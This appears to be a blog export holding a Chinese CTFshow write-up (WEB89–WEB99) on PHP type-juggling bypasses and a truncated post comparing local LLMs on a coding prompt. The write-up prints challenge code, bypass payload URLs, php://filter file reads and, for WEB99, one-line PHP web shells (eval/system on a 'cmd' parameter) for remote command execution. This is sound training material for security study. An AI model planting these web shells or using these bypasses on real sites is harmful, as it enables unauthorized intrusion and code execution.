[{"content":"WEB89 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 15:38:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num)){ echo $flag; } } çŸ¥è¯†ç‚¹ï¼š intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚\npayload:\n1 https://416503b4-7991-4199-8ad0-ac925fae2d37.challenge.ctf.show/?num[]=1 è¿™é‡Œæ˜¯æ•°ç»„ç»•è¿‡ preg_match,intval è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œ preg_match æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥è¯¢çš„ é‡åˆ°æ•°ç»„ä¼šfalse è€Œintvalæ˜¯å°†å­—ç¬¦ä¸²å˜ä¸ºæ•´å‹ é‡åˆ°æ•°ç»„ä¼šè¿”å›1 ï¼ˆä¹Ÿå°±æ˜¯trueï¼‰\nWEB90 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:06:11 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num===\u0026#34;4476\u0026#34;){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } å½“ä½ ä½¿ç”¨ intval($_GET[\u0026rsquo;num\u0026rsquo;], 0) æ—¶ï¼ŒPHP å°†å¯¹å­—ç¬¦ä¸² 4476# è¿›è¡Œæ•´æ•°è½¬æ¢ï¼ŒPHP çš„ intval å‡½æ•°ä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†æå–æœ‰æ•ˆæ•°å€¼ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦å°±åœæ­¢äº†ï¼Œæ‰€ä»¥å½“ä½ ä¼ å…¥4476çš„æ—¶å€™ï¼Œåªè¦åœ¨å…¶åé¢åŠ å…¥ç‰¹æ®Šç¬¦å·çš„urlç¼–ç å€¼å³å¯ç»•è¿‡ ç¤ºä¾‹:?num=4476%23 ?num=4476%09 ç­‰ç­‰\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„4476.1ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°ä¼šæŠŠå˜é‡æˆªæ–­æˆæ•´æ•°ï¼Œä½†æ˜¯å‰é¢æ˜¯å¼ºç­‰äºï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç­‰ç»•è¿‡ï¼Œä¾‹å¦‚4476e1ç­‰ç­‰\né™„ä¸Šä¸€ä¸ªç»“æœè¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval(\u0026#39;42\u0026#39;); // 42 echo intval(\u0026#39;+42\u0026#39;); // 42 echo intval(\u0026#39;-42\u0026#39;); // -42 echo intval(042); // 34 echo intval(\u0026#39;042\u0026#39;); // 42 echo intval(1e10); // 10000000000 echo intval(\u0026#39;1e10\u0026#39;); // 10000000000 echo intval(0x1A); // 26 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0 echo intval(\u0026#39;420000000000000000000\u0026#39;); // 2147483647 echo intval(42, 8); // 42 echo intval(\u0026#39;42\u0026#39;, 8); // 34 echo intval(array()); // 0 echo intval(array(\u0026#39;foo\u0026#39;, \u0026#39;bar\u0026#39;)); // 1 ?\u0026gt; WEB91 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Firebasky # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:16:09 # @link: https://ctfer.com */ show_source(__FILE__); include(\u0026#39;flag.php\u0026#39;); $a=$_GET[\u0026#39;cmd\u0026#39;]; if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ echo \u0026#39;hacker\u0026#39;; } else{ echo $flag; } } else{ echo \u0026#39;nonononono\u0026#39;; } payload:\n1 https://c84c2759-252c-4054-a660-3e9eb008861c.challenge.ctf.show/?cmd=%0Aphp ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨äº†å¤šè¡Œæ¨¡å¼ï¼ˆmï¼‰ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªæ²¡æœ‰ï¼Œä¹Ÿå°±æ˜¯åªèƒ½è¯»å–ç¬¬ä¸€è¡Œçš„å†…å®¹ï¼Œå¡ä¸€ä¸ª%0Aï¼ˆæ¢è¡Œï¼‰å°±å¯ä»¥äº†\nWEB92 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Firebasky # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:29:30 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } payload:\n1 https://7c687645-6793-4d20-ab0f-2d5c73dfac3b.challenge.ctf.show/?num=4476.1 å’Œä¹‹å‰ä¸€æ ·ï¼Œä¸è¿‡è¿™æ¬¡ä¸èƒ½ä¼ æ•°ç»„äº†ï¼Œå¦å¤–ä¹Ÿå¯ç”¨ç§‘å­¦è®¡æ•°æ³•ä¾‹å¦‚4476e123ç­‰ã€‚\nWEB93 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Firebasky # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:32:58 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } payload:\n1 https://4b54cc99-f5a8-410c-8769-9f363d53fe84.challenge.ctf.show/?num=4476.1 åŒä¸Šï¼Œè¿™æ¬¡å¢åŠ äº†å¯¹å­—æ¯çš„è¿‡æ»¤ï¼Œä¸èƒ½ç”¨ç§‘å­¦è®¡æ•°æ³•äº†ã€‚\nå®˜æ–¹çš„è§£æ³•æ˜¯ è¿‡æ»¤äº†å­—æ¯ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–è¿›åˆ¶å°±æ˜¯è®¡ç®— 0b?? : äºŒè¿›åˆ¶0??? : å…«è¿›åˆ¶ 0X?? : 16è¿›åˆ¶ payload ï¼š ?num=010574\nWEB94 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:46:19 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num===\u0026#34;4476\u0026#34;){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ die(\u0026#34;no no no!\u0026#34;); } if(!strpos($num, \u0026#34;0\u0026#34;)){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)===4476){ echo $flag; } } è¿™æ¬¡è¯•äº†ä¸€ä¸‹ï¼Œå‰é¢çš„å‡ ä¸ªpayloadéƒ½ä¸èƒ½ç”¨äº†ï¼Œæ€ä¹ˆåŠå‘¢\nç®€å•å¯¹æ¯”ä¸€ä¸‹å‘ç°å¤šäº†ä¸€ä¸ªstrpos\nï¼ˆåŠŸèƒ½ï¼šè¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚ï¼‰\nè¿™ç©æ„ä¼šæ£€æµ‹0çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰0æ—¶å€™ä¼šè¿”å›falseï¼Œä½†æ˜¯å¦‚æœ0åœ¨ç¬¬ä¸€ä¸ªä½ç½®ä¼šè¿”å›ä¸€ä¸ª0ï¼ˆfalseï¼‰ï¼Œå–ååä¸º1ï¼Œå³trueã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½è®©0åœ¨ç¬¬ä¸€ä¸ªä½ç½®æˆ–è€…ä¸å­˜åœ¨ï¼Œå¯ä»¥ä½¿ç”¨?num=4476.0ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥åœ¨åŸæ¥çš„payloadå‰é¢åŠ ä¸ªç©ºæ ¼ä¹Ÿå¯ä»¥ã€‚\nWEB95 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 16:53:59 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ die(\u0026#34;no no no!!\u0026#34;); } if(!strpos($num, \u0026#34;0\u0026#34;)){ die(\u0026#34;no no no!!!\u0026#34;); } if(intval($num,0)===4476){ echo $flag; } } payload:\n1 https://713cbc8d-5dc7-4fab-9390-fb8398456921.challenge.ctf.show/?num=%20010574 åŒä¸Šä¸€é“é¢˜ï¼Œä¸è¿‡è¿™é‡ŒæŠŠ.ç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨xxxx.xè¿™ç§äº†ï¼Œæ”¹ç”¨ä¹‹å‰çš„8è¿›åˆ¶å‰é¢åŠ ç©ºæ ¼/æ¢è¡Œç¬¦ç­‰ç­‰å³å¯\nå®˜æ–¹wpè¯´è¿™é‡ŒåŠ ä¸€äº›ç¬¦å·ï¼ˆæ¯”å¦‚+ï¼‰ä¹Ÿå¯ä»¥\nWEB96 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 19:21:24 # @link: https://ctfer.com */ highlight_file(__FILE__); if(isset($_GET[\u0026#39;u\u0026#39;])){ if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ die(\u0026#34;no no no\u0026#34;); }else{ highlight_file($_GET[\u0026#39;u\u0026#39;]); } } payload:\n1 https://f2dd7e6-2d47-4204-9ad8-8030acb1e13b.challenge.ctf.show/?u=../html/flag.php å…ˆç©¿è¶Šä¸€ä¸ªè·¯å¾„å†å›æ¥å°±è¡Œäº†ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨./flag.phpè¿™ç§\nè¿˜æœ‰äº›å¸ˆå‚…ç”¨çš„è¿™ä¸ªï¼š\n1 ?u=php://filter/read=convert.base64-encode/resource=flag.php WEB96 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 19:36:32 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) echo $flag; else print \u0026#39;Wrong.\u0026#39;; } ?\u0026gt; è¿™é‡Œæˆ‘ä»¬å¾—æ‰¾ä¸¤ä¸ªmd5ç›¸ç­‰çš„ä¸œè¥¿ï¼Ÿ\nå°çŸ¥è¯†ï¼š PHP ä¸­ md5() è¿™ä¸ªå‡½æ•°çš„å‚æ•°å¿…é¡»æ˜¯ stringï¼Œå¦‚æœä¼ ä¸ªæ•°ç»„ä¼šï¼šWarning: md5() expects parameter 1 to be string, array given\nè¿™é‡Œå¦‚æœä¼ è¿›å»æ•°ç»„ï¼Œä¼šè¿”å›NULLå¹¶æŠ¥é”™ï¼Œä¸¤è¾¹éƒ½ä¼ å…¥æ•°ç»„ï¼Œéƒ½è¿”å›NULLå°±ç›¸ç­‰äº†ã€‚\nWEB98 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 21:39:27 # @link: https://ctfer.com */ include(\u0026#34;flag.php\u0026#34;); $_GET?$_GET=\u0026amp;$_POST:\u0026#39;flag\u0026#39;; $_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_COOKIE:\u0026#39;flag\u0026#39;; $_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_SERVER:\u0026#39;flag\u0026#39;; highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;]==\u0026#39;flag\u0026#39;?$flag:__FILE__); ?\u0026gt; payload:\n1 2 https://f07c626b-ca6c-4be3-bd93-85f3d794aa6f.challenge.ctf.show/?flag=flag POST: HTTP_FLAG=flag ç¬¬ä¸€è¡Œåªè¦getéç©ºï¼Œgetå’Œpostå°±ç­‰æ•ˆäº†ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªè¯­å¥å¯ä»¥ä¸è§¦å‘ï¼Œå¦‚æœè§¦å‘äº†å°±æ˜¯åˆ«çš„ä¸œè¥¿å˜æˆGETäº†ï¼Œéšä¾¿ä¼ ä¸ªå‚æ•°ï¼Œç„¶åç›´æ¥postä¸€ä¸ªHTTP_FLAG=flagå³å¯\nå¦‚æœéœ€è¦ç”¨å®Œæ•´çš„é“¾ï¼š\n1 2 3 4 5 GETï¼š?a=1 â†’ è§¦å‘ç¬¬ 1 è¡Œï¼š$_GET =\u0026amp; $_POST POSTï¼šflag=flag â†’ è§¦å‘ç¬¬ 2 è¡Œï¼š$_GET =\u0026amp; $_COOKIE Cookieï¼šflag=flag â†’ è§¦å‘ç¬¬ 3 è¡Œï¼š$_GET =\u0026amp; $_SERVER è¯·æ±‚å¤´åŠ ï¼šFlag: flag â†’ $_SERVER[\u0026#39;HTTP_FLAG\u0026#39;] = \u0026#39;flag\u0026#39; æœ€åä¸€è¡Œç”¨ $_GET[\u0026#39;HTTP_FLAG\u0026#39;]ï¼Œå…¶å®å°±æ˜¯ $_SERVER[\u0026#39;HTTP_FLAG\u0026#39;] â†’ æ¡ä»¶æˆç«‹ï¼Œè¯» flag WEB99 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-18 22:36:12 # @link: https://ctfer.com */ highlight_file(__FILE__); $allow = array(); for ($i=36; $i \u0026lt; 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET[\u0026#39;n\u0026#39;]) \u0026amp;\u0026amp; in_array($_GET[\u0026#39;n\u0026#39;], $allow)){ file_put_contents($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); } ?\u0026gt; tip:file_put_contents($file, $data);\nè¿™ä¸€é“é¢˜ä¹çœ‹èµ·æ¥ä¸€å¤´é›¾æ°´ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯è€ƒä¸€ä¸ªç±»ä¼¼ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ä¸œè¥¿\npayload\n1 2 https://683086c5-872d-4d2e-9265-f758882dfbe8.challenge.ctf.show/?n=2.php POST: content=\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; èšå‰‘ç›´æ¥è¿å°±è¡Œäº†ï¼Œflagåœ¨è¿™é‡Œï¼š/var/www/html/flag36d.php\nAIåˆ†æ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 1. ä»£ç åšäº†ä»€ä¹ˆï¼Ÿ å…ˆæŠŠå½“å‰æºç é«˜äº®è¾“å‡ºï¼ˆæ–¹ä¾¿ä½ çœ‹é¢˜ï¼‰ã€‚ ç„¶åæ„é€ ä¸€ä¸ªæ•°ç»„ $allowï¼š å¾ªç¯ $i = 36 åˆ° $i = 0x36d = 877ï¼ˆä¸å« 877ï¼‰ï¼Œä¸€å…± 841 æ¬¡ï¼› æ¯æ¬¡å¾€ $allow é‡Œ push ä¸€ä¸ª rand(1, $i) çš„éšæœºæ•´æ•°ã€‚ æœ€ååˆ¤æ–­ï¼š å¦‚æœ $_GET[\u0026#39;n\u0026#39;] å­˜åœ¨ï¼Œå¹¶ä¸” in_array($_GET[\u0026#39;n\u0026#39;], $allow) ä¸ºçœŸï¼Œ å°±æ‰§è¡Œï¼šfile_put_contents($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); â€”â€” æŠŠä½  POST ä¸Šæ¥çš„å†…å®¹å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯ $_GET[\u0026#39;n\u0026#39;]ã€‚ æ ¸å¿ƒé—®é¢˜ï¼š æ€ä¹ˆè®© in_array($_GET[\u0026#39;n\u0026#39;], $allow) ä¸ºçœŸï¼Œå¹¶æŠŠæ¶æ„ PHP å†™åˆ°ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶é‡Œï¼Ÿ 2. $allow é‡Œåˆ°åº•æœ‰ä»€ä¹ˆï¼Ÿï¼ˆé¡ºä¾¿ç®—ä¸ªæ¦‚ç‡ï¼‰ å¾ªç¯ï¼š for ($i=36; $i \u0026lt; 877; $i++) { array_push($allow, rand(1,$i)); } ç¬¬ä¸€æ¬¡ï¼ši = 36ï¼Œå– rand(1, 36) ç¬¬äºŒæ¬¡ï¼ši = 37ï¼Œå– rand(1, 37) â€¦ æœ€åä¸€æ¬¡ï¼ši = 876ï¼Œå– rand(1, 876) æ‰€ä»¥ $allow æ˜¯é•¿åº¦ 841 çš„æ•°ç»„ï¼Œé‡Œé¢æ˜¯å¾ˆå¤š 1 ~ 876 çš„éšæœºæ•´æ•°ï¼ˆå¯ä»¥é‡å¤ï¼‰ã€‚ æˆ‘ä»¬å…³å¿ƒæŸä¸ªæ•°å­— k å‡ºç°åœ¨ $allow é‡Œçš„æ¦‚ç‡ã€‚ æŸä¸ªæ•°å­— k æ²¡è¢«é€‰ä¸­çš„æ¦‚ç‡ åªæœ‰å½“å¾ªç¯ä¸­ i \u0026gt;= k æ—¶ï¼Œæ‰å¯èƒ½æŠ½åˆ° kã€‚ å¯¹æ¯ä¸ªè¿™æ ·çš„ iï¼Œå½“å‰è¿™ä¸€æ¬¡æ²¡æŠ½åˆ° k çš„æ¦‚ç‡æ˜¯ï¼š 1 - 1/i = (i-1)/i æ‰€ä»¥ï¼š å¦‚æœ k \u0026lt;= 36ï¼šèƒ½æŠ½åˆ°å®ƒçš„å¾ªç¯æ˜¯ i = 36...876 å¦‚æœ k \u0026gt; 36ï¼šèƒ½æŠ½åˆ°å®ƒçš„å¾ªç¯æ˜¯ i = k...876 è®° a = max(36, k)ï¼Œåˆ™ â€œä»æ¥æ²¡æŠ½åˆ° kâ€ çš„æ¦‚ç‡æ˜¯ï¼š P(æ²¡æŠ½åˆ° k) = âˆ_{i=a}^{876} (i-1)/i = (a-1)/876 â† è¿™æ˜¯ä¸ªæœ›è¿œé•œç§¯ äºæ˜¯ï¼š P(æŠ½åˆ° k) = 1 - (a-1)/876 = 1 - (max(36,k)-1)/876 ç‰¹åˆ«åœ°ï¼š å½“ k \u0026lt;= 36 æ—¶ï¼ša = 36 P(k åœ¨ allow ä¸­) = 1 - 35/876 = 841/876 â‰ˆ 96% å½“ k = 876 æ—¶ï¼š P(k åœ¨ allow ä¸­) = 1 - 875/876 = 1/876 â‰ˆ 0.1%ï¼ˆå¾ˆéš¾ä¸­ï¼‰ ç»“è®ºï¼šå°ä¸€ç‚¹çš„æ•°å­—ï¼ˆâ‰¤36ï¼‰å‡ ä¹æ€»ä¼šå‡ºç°åœ¨ $allow é‡Œï¼Œå‘½ä¸­ç‡ â‰ˆ96%ã€‚ 3. in_array() çš„å¤§å‘ï¼šå¼±ç±»å‹æ¯”è¾ƒ å…³é”®è¯­å¥ï¼š in_array($_GET[\u0026#39;n\u0026#39;], $allow) æ²¡æœ‰ç¬¬ä¸‰ä¸ªå‚æ•° trueï¼Œæ‰€ä»¥æ˜¯å¼±ç±»å‹æ¯”è¾ƒã€‚ $allow é‡Œçš„å…ƒç´ æ˜¯ int $_GET[\u0026#39;n\u0026#39;] æ˜¯ string PHP çš„å¼±æ¯”è¾ƒè§„åˆ™æ˜¯ï¼š å½“ int == string æ—¶ï¼Œstring ä¼šæŒ‰ æ•°å­— æ¥è½¬ï¼š \u0026#34;1\u0026#34; â†’ 1 \u0026#34;1.php\u0026#34; â†’ 1 \u0026#34;123abc\u0026#34; â†’ 123 \u0026#34;abc\u0026#34; â†’ 0 ä¸¾ä¸ªä¾‹å­ï¼š in_array(\u0026#34;1.php\u0026#34;, [1, 2, 3]); // trueï¼Œå› ä¸º \u0026#34;1.php\u0026#34; ä¼šå˜æˆ 1 in_array(\u0026#34;123.txt\u0026#34;, [123, 456]); // trueï¼Œå› ä¸º \u0026#34;123.txt\u0026#34; -\u0026gt; 123 æ‰€ä»¥å¦‚æœ $allow é‡ŒåŒ…å«æ•´æ•° 1ï¼Œé‚£ä¹ˆï¼š in_array(\u0026#39;1.php\u0026#39;, $allow) // ä¹Ÿä¼šæ˜¯ true 4. ç»„åˆèµ·æ¥ï¼šå¯ä»¥å†™ä»»æ„ PHP æ–‡ä»¶ï¼ˆé«˜æ¦‚ç‡æˆåŠŸï¼‰ åˆ©ç”¨æ€è·¯ é€‰ä¸€ä¸ªå°æ•´æ•°ï¼Œæ¯”å¦‚ 1ï¼ˆâ‰¤36ï¼Œå‘½ä¸­ç‡é«˜ï¼‰ã€‚ è®¿é—®æ—¶ä¼ ï¼š?n=1.php åœ¨ in_array() é‡Œï¼Œ\u0026#39;1.php\u0026#39; ä¼šè¢«å½“æˆæ•°å­— 1 å»æ¯”ã€‚ åªè¦ $allow é‡Œæ­£å¥½å«æœ‰æ•´æ•° 1ï¼ˆæ¦‚ç‡ â‰ˆ96%ï¼‰ï¼Œin_array() å°±ä¸ºçœŸã€‚ POST ä¸€ä¸ªä½ æƒ³å†™å…¥çš„ PHP ä»£ç ï¼š \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ç„¶åè®¿é—® /1.php?cmd=whoami å°±èƒ½ RCE äº†ã€‚ WEB100 ","date":"2025-11-25T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_features_write_up_1/","title":"CTF_show Web PHPç‰¹æ€§ WEB89-WEB99"},{"content":"æµ‹è¯•ä¸€ä¸‹å‡ ä¸ªå¸¸ç”¨æœ¬åœ°AIçš„ç¼–ç¨‹èƒ½åŠ›\né¸½äº†è¿™ä¹ˆä¹…ï¼Œæ›´ç‚¹èµ›åšæ–—è›è›\næ–‡ç« æœ«å°¾æœ‰æœ¬æ¬¡æµ‹è¯•å¾—åˆ°çš„æ‰€æœ‰ç›¸å…³æ–‡ä»¶\nä¸€ã€æµ‹è¯•æ¡ä»¶ æœ¬åœ°ç¯å¢ƒ\n1 2 3 4 AMD 7940HX 32GiB RAM RTX4060 8GiBç¬”è®°æœ¬æ˜¾å¡ æœ¬åœ°æ¨¡å‹ç¯å¢ƒï¼šLM Studio ä½¿ç”¨çš„prompt\n1 write a Python program that shows a ball bouncing inside a spinning hexagon. The ball should be affected by gravity and friction, and it must bounce off the rotating walls realistically å—è¯•æ¨¡å‹å‡ä¸ºçº¯æœ¬åœ°è¿è¡Œï¼Œæ‰€æœ‰å‚ä¸æ¨¡å‹å‡é‡‡ç”¨Pass@1æ¨¡å¼ï¼Œå³åªæœ‰ä¸€æ¬¡æœºä¼šè¾“å‡ºï¼Œæ²¡æœ‰è°ƒè¯•æœºä¼šã€‚\nä½¿ç”¨æ¨¡å‹å‡ä¸ºLMStudioå®˜æ–¹æ¥æºä¸‹è½½ã€‚\nè‹¥æ²¡æœ‰ç‰¹æ®Šè¯´æ˜ï¼Œå‚è¯•æ¨¡å‹å‡é‡‡ç”¨4Bité‡åŒ–ç‰ˆæ¨¡å‹ã€‚\näºŒã€æµ‹è¯•ç»“æœ Qwen3-30b-a3b-2507 å¯è¿è¡Œâ­• é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦âš¡âš¡âš¡\n16.24 token/s 1962 token\nå†™å‡ºæ¥çš„ç¨‹åºå¯ä»¥æ‰“å¼€ï¼Œä½†æ˜¯çƒåªè¦ç¢°åˆ°è¾¹ç¼˜ä¼šæŠ¥é”™é€€å‡º\n1 2 3 4 5 6 7 8 9 C:\\Users\\xqb\\Desktop\\1\u0026gt;py \u0026#34;Qwen3-30b-a3b-2507 Pass@1.py\u0026#34; C:\\Users\\xqb\\AppData\\Roaming\\Python\\Python313\\site-packages\\pygame\\pkgdata.py:25: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. from pkg_resources import resource_stream, resource_exists pygame 2.6.1 (SDL 2.28.4, Python 3.13.3) Hello from the pygame community. https://www.pygame.org/contribute.html Traceback (most recent call last): File \u0026#34;C:\\Users\\xqb\\Desktop\\1\\Qwen3-30b-a3b-2507 Pass@1.py\u0026#34;, line 158, in \u0026lt;module\u0026gt; ball_pos[0] += normal[0] * (ball_radius - distance) ^^^^^^^^ Qwen3-8B å¯è¿è¡Œâœ” é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦ğŸ¢\n8.40 token/s 14035 token\n//å°æ¨¡å‹è¿‡åº¦æ€è€ƒä¸¥é‡ï¼Œæ¶ˆè€—tokenéå¸¸éå¸¸å¤šã€‚è¿™ç§æ¯”è¾ƒå¤æ‚çš„ä»»åŠ¡å»ºè®®è¿˜æ˜¯ç”¨å¤§ç‚¹çš„æ¨¡å‹å§ã€‚\næ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯å°çƒä¼šç›´æ¥æ‰å‡ºå»ï¼Œæœ€ååªå‰©ä¸‹ä¸€ä¸ªæ­£åœ¨è½¬çš„å…­è¾¹å½¢ã€‚\nQwen3-14B å¯è¿è¡Œâœ” é€šè¿‡âŒ å®Œç¾è¿è¡ŒâŒ é€Ÿåº¦ğŸ¢\n5.88 token/s 12464 